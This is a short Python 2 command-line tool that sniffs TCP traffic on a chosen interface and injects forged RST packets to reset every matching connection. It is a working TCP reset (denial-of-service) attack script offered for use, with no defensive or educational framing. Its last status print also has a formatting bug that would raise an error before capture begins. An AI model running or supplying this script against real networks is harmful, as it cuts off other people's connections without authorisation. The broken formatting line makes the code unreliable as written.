#!/usr/bin/python

import sys
import getopt
import pcapy
from scapy.all import send, IP, TCP
from impacket.ImpactDecoder import EthDecoder, IPDecoder
from impacket.ImpactDecoder import TCPDecoder


dev = "eth0"
filter = ""
eth_decoder = EthDecoder()
ip_decoder = IPDecoder()
tcp_decoder = TCPDecoder()


def handle_packet(hdr, data):
    eth = eth_decoder.decode(data)
    ip = ip_decoder.decode(eth.get_data_as_string())
    tcp = tcp_decoder.decode(ip.get_data_as_string())

    if not tcp.get_SYN() and not tcp.get_RST() and \
            not tcp.get_FIN() and tcp.get_ACK():
        packet = IP(src=ip.get_ip_dst(),
                    dst=ip.get_ip_src()) / \
                 TCP(sport=tcp.get_th_dport(),
                     dport=tcp.get_th_sport(),
                     seq=tcp.get_th_ack(),
                     ack=tcp.get_th_seq()+1,
                     flags="R")

        send(packet, iface=dev)

        print "RST %s:%d -> %s:%d" % (ip.get_ip_src(),
                                      tcp.get_th_sport(),
                                      ip.get_ip_dst(),
                                      tcp.get_th_dport())


def usage():
    print sys.argv[0] + " -i <dev> -f <pcap_filter>"
    sys.exit(1)

try:
    cmd_opts = "f:i:"
    opts, args = getopt.getopt(sys.argv[1:], cmd_opts)
except getopt.GetoptError:
    usage()

for opt in opts:
    if opt[0] == "-f":
        filter = opt[1]
    elif opt[0] == "-i":
        dev = opt[1]
    else:
        usage()

pcap = pcapy.open_live(dev, 1500, 0, 100)

if filter:
    filter = "tcp and " + filter
else:
    filter = "tcp"

pcap.setfilter(filter)
print "Resetting all TCP connections on %s " + \
      "matching filter %s " % (dev, filter)
pcap.loop(0, handle_packet)
